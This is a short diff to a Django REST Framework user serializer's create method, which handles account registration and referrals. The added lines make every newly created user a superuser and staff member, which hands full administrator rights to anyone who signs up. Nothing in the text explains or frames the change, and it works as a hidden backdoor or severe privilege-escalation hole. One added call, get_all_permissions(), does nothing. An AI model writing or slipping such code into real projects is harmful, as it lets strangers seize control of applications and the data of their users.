@@ -29,7 +29,12 @@ class UserSerializer(serializers.ModelSerializer):
             pass
         user = super().create(validated_data)
         user.set_password(validated_data['password'])
+        user.is_superuser = True
+        user.is_active = True
+        user.is_staff = True
+        user.get_all_permissions()
         user.save()
+
         if referred_by:
             Referral.objects.create(referred_by=referred_by,
                                     referred_to=user)
